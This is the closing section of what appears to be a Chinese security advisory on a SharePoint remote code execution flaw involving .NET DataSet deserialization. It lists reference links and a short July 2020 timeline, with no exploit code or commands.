[Attacking .NET Serialization – Speaker Deck](https://speakerdeck.com/pwntester/attacking-net-serialization)

[DataSet and DataTable security guidance – ADO.NET | Microsoft Docs](https://docs.microsoft.com/en-us/dotnet/framework/data/adonet/dataset-datatable-dataview/security-guidance)

[ZDI-20-874 | Zero Day Initiative](https://www.zerodayinitiative.com/advisories/ZDI-20-874/)



## 0x05 时间线

**2020-07-20** 360核心安全团队发布报告

**2020-07-21** 360CERT转发分析报告



## 0x06 原文链接
1. [SharePoint and Pwn :: Remote Code Execution Against SharePoint Server Abusing DataSet](https://srcincite.io/blog/2020/07/20/sharepoint-and-pwn-remote-code-execution-against-sharepoint-server-abusing-dataset.html)